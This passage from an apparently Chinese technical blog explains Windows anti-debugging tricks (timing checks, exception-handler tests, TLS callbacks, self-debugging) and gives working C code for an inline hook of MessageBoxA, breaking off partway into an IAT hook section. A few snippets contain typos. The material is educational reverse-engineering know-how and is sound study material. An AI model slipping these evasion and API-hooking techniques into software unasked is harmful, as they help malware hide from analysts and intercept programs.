class="line">t1=((int64_t)1o)|((int64_t)hi&lt;32);</span><br><span class="line">__asm&#123;</span><br><span class="line">rdtsc</span><br><span class="line">mov[lo],eax</span><br><span class="line">mov [hi],edx</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t2 = ((int64_t)1o)|((int64_t)hi &lt;32);</span><br><span class="line">printf(&quot;t2-t1=%x\n&quot;,t2 -t1):</span><br><span class="line">//不同的CPU该差值不同，还有可能发生线程切换使差值大于一般情况，：</span><br><span class="line">//所以谨慎使用这种反调试方法</span><br><span class="line">return t2 - t1 &gt; 0x100;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只要保证两次<code>rdtsc</code>运行结束后结果相同即可。</p><p>时间API</p><p>这些API也是一种反调试手段，这些API有：QueryPerformanceCounter、GetTickCount、GetSystemTime、GetLocalTime等。这里介绍一种QueryPerformanceCounter的使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">CheckDebug_QueryPerformanceCounter</span><span class="params">()</span>&#123;</span><br><span class="line">LARGE_INTEGER startTime endTime;</span><br><span class="line">QueryPerformanceCounter(&amp;startTime):</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;检测&quot;</span>);</span><br><span class="line">QueryPerformanceCounter(&amp;endTime):</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,endTime.QuadPart - startTime.QuadPart);</span><br><span class="line"><span class="keyword">return</span> endTime.QuadPart - startTime.QuadPart &gt; <span class="number">0x500</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以改变函数调用结果，使两次调用时间相同。（注意：一般这些时间API也会用于其他用途，所以除非明确知道所有的该API调用都是用来反调试，否则不要随便HOOK。）</p><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>在正常运行的进程中发生异常时，操作系统会接受异常，调用程序中注册的SEH处理。而在调试器进程中，那么调试器就会先于SEH接受异常消息，让调试器去处理异常信息。利用该特征可判断进程是正常运行还是调试运行，然后根据不同的结果执行不同的操作，这就是利用异常处理机制不同的反调试原理。</p><p>常见的异常有：<a href="https://msdn.microsoft.com/zh-tw/library/aa915076.aspx">https://msdn.microsoft.com/zh-tw/library/aa915076.aspx</a></p><p>如果一个异常发生而没有注册异常处理程序（或者已经注册但没有处理这样的异常），<code>kernel32!UnhandledExceptionFilter()</code>函数将被调用。可以使用<code>kernel32!SetUnhandledExceptionFilter()</code>来注册一个自定义的未处理异常过滤器。但是如果程序在调试器下运行，自定义的过滤器将不会被调用，异常将被传递给调试器。因此，如果未处理的异常过滤器被注册，并且控制被传递给它，那么这个进程就不是在调试器下运行。</p><p>处理方法可以看一下这篇文章：<a href="https://www.52pojie.cn/thread-933123-1-1.html">https://www.52pojie.cn/thread-933123-1-1.html</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LONG <span class="title function_">UnhandledExceptionFilter</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCONTEXT ctx = pExceptionInfo-&gt;ContextRecord;</span><br><span class="line">    ctx-&gt;Eip += <span class="number">3</span>; <span class="comment">// Skip \xCC\xEB\</span></span><br><span class="line"><span class="comment">    return EXCEPTION_CONTINUE_EXECUTION;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">bool</span> <span class="title function_">Check</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> bDebugged = <span class="literal">true</span>;</span><br><span class="line">    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)UnhandledExceptionFilter);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">3</span>                      </span><br><span class="line">        jmp near being_debugged    </span><br><span class="line">    &#125;</span><br><span class="line">    bDebugged = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">being_debugged:</span><br><span class="line">    <span class="keyword">return</span> bDebugged;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h3><p>TLS 回调函数为开发者提供了一种灵活的机制，可以在程序加载时或者线程创建时执行特定的操作，用于初始化、资源管理、异常处理等方面在Windows操作系统中，TLS回调函数是通过TLS回调表来管理的。这些回调函数通常在DLL文件中实现，并通过动态链接库（DLL）的入口点DllMain函数进行注册。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLS_CALLBACK1</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _M_IX86</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _M_X64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"><span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">PIMAGE_TLS_CALLBACK _tls_callback[] = &#123; TLS_CALLBACK1,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg ()</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg ()</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLS_CALLBACK1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (IsDebuggerPresent())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TLS_CALLBACK: Debugger Detected!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TLS_CALLBACK: No Debugger Present!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;233\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>由操作系统或者运行时库（如 C 运行时库）所启动的一些线程，用于执行一些初始化或其他任务。在这些线程中，TLS 回调函数会先于main函数调用。</p><p>要在程序中使用TLS，必须为TLS数据单独建一个数据段，用相关数据填充此段，并通知链接器为TLS数据在PE文件头中添加数据。_tls_callback[]数组中保存了所有的TLS回调函数指针。数组必须以NULL指针结束，且数组中的每一个回调函数在程序初始化时都会被调用，程序员可按需要添加。但程序员不应当假设操作系统已何种顺序调用回调函数。如此则要求在TLS回调函数中进行反调试操作需要一定的独立性。</p><p>这个程序就会多出来一个.tls段</p><p><img src="https://s2.loli.net/2024/04/29/y2uC7OUFw4deYv8.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/29/y2uC7OUFw4deYv8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240429214511965"></p><h3 id="双进程守护"><a href="#双进程守护" class="headerlink" title="双进程守护"></a>双进程守护</h3><p>一个进程只能被调试器附加一次。利用这一点可以自己先调试运行自己，防止被另一个调试器继续调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">DebugMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(!IsDebuggerPresent()) <span class="comment">//区分调试进程与被调试进程，以执行不同的代码。</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> DebugMain(hInstance,hPrevInstance,lpCmdLine,nCmdShow); </span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  __asm(<span class="string">&quot;int $3&quot;</span>);</span><br><span class="line">  MessageBox(<span class="number">0</span>,<span class="string">&quot;这是一个简单的例子&quot;</span>,<span class="string">&quot;TraceMe&quot;</span>,<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">DebugMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span> <span class="comment">//调试进程主函数</span></span><br><span class="line">&#123;  </span><br><span class="line">  <span class="type">char</span> filename[MAX_PATH];</span><br><span class="line">  GetModuleFileName(<span class="number">0</span>,filename,MAX_PATH); <span class="comment">//获取自身文件名</span></span><br><span class="line">  STARTUPINFO  si=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  GetStartupInfo(&amp;si);</span><br><span class="line">  PROCESS_INFORMATION  pi=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(!CreateProcess(filename,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,DEBUG_PROCESS|DEBUG_ONLY_THIS_PROCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;si,&amp;pi)) <span class="comment">//创建被调试进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  BOOL WhileDoFlag=TRUE;</span><br><span class="line">  DEBUG_EVENT DBEvent ;</span><br><span class="line">  DWORD dwState;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">while</span> (WhileDoFlag) </span><br><span class="line">  &#123;</span><br><span class="line">    WaitForDebugEvent (&amp;DBEvent, INFINITE);</span><br><span class="line">    dwState = DBG_EXCEPTION_NOT_HANDLED ;</span><br><span class="line">    <span class="keyword">switch</span> (DBEvent.dwDebugEventCode)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> CREATE_PROCESS_DEBUG_EVENT:</span><br><span class="line">        dwState = DBG_CONTINUE ;</span><br><span class="line">        <span class="keyword">break</span>;      </span><br><span class="line">         </span><br><span class="line">      <span class="keyword">case</span> EXIT_PROCESS_DEBUG_EVENT :</span><br><span class="line">        WhileDoFlag=FALSE;</span><br><span class="line">        <span class="keyword">break</span> ;</span><br><span class="line">       </span><br><span class="line">      <span class="keyword">case</span> EXCEPTION_DEBUG_EVENT:</span><br><span class="line">        <span class="keyword">switch</span> (DBEvent.u.Exception.ExceptionRecord.ExceptionCode)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> EXCEPTION_BREAKPOINT:</span><br><span class="line">          &#123;</span><br><span class="line">            dwState = DBG_CONTINUE ;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    ContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, dwState) ;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  CloseHandle(pi.hProcess) ;</span><br><span class="line">  CloseHandle(pi.hThread)  ;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建出两个一样的进程，只不过一个作为调试器，一个作为被调试进程，可以使用异常来进行控制程序执行。</p>]]></content>
      
      
      <categories>
          
          <category> 代码保护 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PE--Hook</title>
      <link href="/2022/09/12/Hook%E6%96%B9%E6%B3%95/"/>
      <url>/2022/09/12/Hook%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>Hook各种API函数实现自己的功能</p><span id="more"></span><h2 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h2><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>实现Inline Hook可以理解为修改程序的执行流，到另外一块内存中执行我们需要的操作，结束之后返回到原来的地方接着执行程序原本的操作。在这里需要考虑的问题有以下几点：</p><ul><li>如何找到跳转的地址；</li><li>如何保护现场以及还原执行流；</li><li>如果内存页不可写如何解决。</li></ul><h3 id="代码编写思路"><a href="#代码编写思路" class="headerlink" title="代码编写思路"></a>代码编写思路</h3><p>使用<code>JMP</code>指令来进行跳转操作（无条件跳转就是好用）。但是<code>JMP</code>后的地址（操作数）如何寻找？</p><p><code>JMP</code>的目标地址是相对于下一条指令的位置进行计算，计算公式为：<code>JMP</code> 后面的地址（操作数） &#x3D; 目的地址 - 源地址 - 5。其中，5 是 <code>JMP</code> 指令的字节数。</p><p>接着考虑还原函数的地址，我们<code>JMP</code>到自定义函数后，执行完自定义函数的内容，接着就需要还原执行流恢复到原函数中。还原地址 &#x3D; 获取下一条指令地址（原函数地址+5） - 分配到的内存的地址 - 指令长度（5）</p><p>代码实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于跳转到MyMessageBoxA的指令，0xE9代表JMP指令</span></span><br><span class="line">BYTE JmpOriginal[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;  </span><br><span class="line"><span class="comment">// 存储原始MessageBoxA的前5个字节</span></span><br><span class="line">BYTE OldCode[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;; </span><br><span class="line"><span class="comment">// MessageBoxA的函数地址</span></span><br><span class="line">FARPROC MessageBoxAddress;</span><br><span class="line"><span class="comment">// 还原函数地址</span></span><br><span class="line"><span class="type">void</span>* Trampoline;                             </span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义的MessageBoxA函数</span></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;MessageBoxA 已经被Hook\n&quot;</span>);  <span class="comment">// 打印被Hook的信息</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回原函数调用原始的MessageBoxA，这里需要类型转换</span></span><br><span class="line">    <span class="type">int</span> ret = ((<span class="type">int</span> (WINAPI*)(HWND, LPCTSTR, LPCTSTR, UINT))Trampoline)(hWnd, lpText, lpCaption, uType);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InlineHook</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 加载user32.dll模块</span></span><br><span class="line">    HMODULE hModule_User32 = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);  </span><br><span class="line">    <span class="comment">// 获取MessageBoxA的函数地址</span></span><br><span class="line">    MessageBoxAddress = GetProcAddress(hModule_User32, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 计算跳转到自定义函数的地址</span></span><br><span class="line">    DWORD JmpAddress = (DWORD)MyMessageBoxA - (DWORD)MessageBoxAddress - <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 将跳转地址复制到JmpOriginal的第二个字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;JmpOriginal[<span class="number">1</span>], &amp;JmpAddress, <span class="number">4</span>);  </span><br><span class="line"><span class="comment">// 读取并保存MessageBoxA的前5个字节</span></span><br><span class="line">    ReadProcessMemory(GetCurrentProcess(), MessageBoxAddress, OldCode, <span class="number">5</span>, <span class="literal">NULL</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配10个字节的内存空间用来放入跳转回原函数的指令</span></span><br><span class="line">    Trampoline = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">10</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 复制MessageBoxA的前5个字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Trampoline, OldCode, <span class="number">5</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算还原函数的地址（原函数地址+5获取下一条指令地址后-分配内存的地址-指令长度）</span></span><br><span class="line">    DWORD jmpBackAddr = (DWORD)MessageBoxAddress + <span class="number">5</span> - (DWORD)Trampoline - <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// JMP</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)((DWORD)Trampoline + <span class="number">5</span>), &amp;JmpOriginal[<span class="number">0</span>], <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// MessageBoxA 函数中的下一条指令地址。</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)((DWORD)Trampoline + <span class="number">6</span>), &amp;jmpBackAddr, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="comment">// 修改MessageBoxA的前5个字节的页属性，使其可读可写可执行</span></span><br><span class="line">    VirtualProtect(MessageBoxAddress, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 替换MessageBoxA的前5个字节为跳转到MyMessageBoxA的指令</span></span><br><span class="line">    WriteProcessMemory(GetCurrentProcess(), MessageBoxAddress, &amp;JmpOriginal[<span class="number">0</span>], <span class="number">5</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复MessageBoxA的前5个字节的原始页属性</span></span><br><span class="line">    VirtualProtect(MessageBoxAddress, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    InlineHook();  <span class="comment">// 实施Inline Hook</span></span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hello World&quot;</span>, <span class="string">&quot;Title&quot;</span>, MB_OK);  <span class="comment">// 调用MessageBoxA函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概流程就是将<code>MessageBoxA</code>的地址先通过<code>WriteProcessMemory</code>改为自定义函数的地址，同时开辟空间写入原函数的第一条指令和跳转回原函数的地址指令，接着等到自定义函数执行结束后作为函数指针调用原函数。</p><h2 id="IAT-Hook"><a href="#IAT-Hook" class="headerlink" title="IAT Hook"></a>IAT Hook</h2><h3 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h3><p>思路与Inline Hook大同小异。在Inline Hook中，我们关注的是<code>JMP</code>跳转后再跳转回去，而在IAT Hook中，我们只需要关注如何将自定义函数地址替换IAT函数地址即可，不需要自己来实现跳来跳去。配合一些DLL注入技术，就可以达到任意API函数Hook了。</p><h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 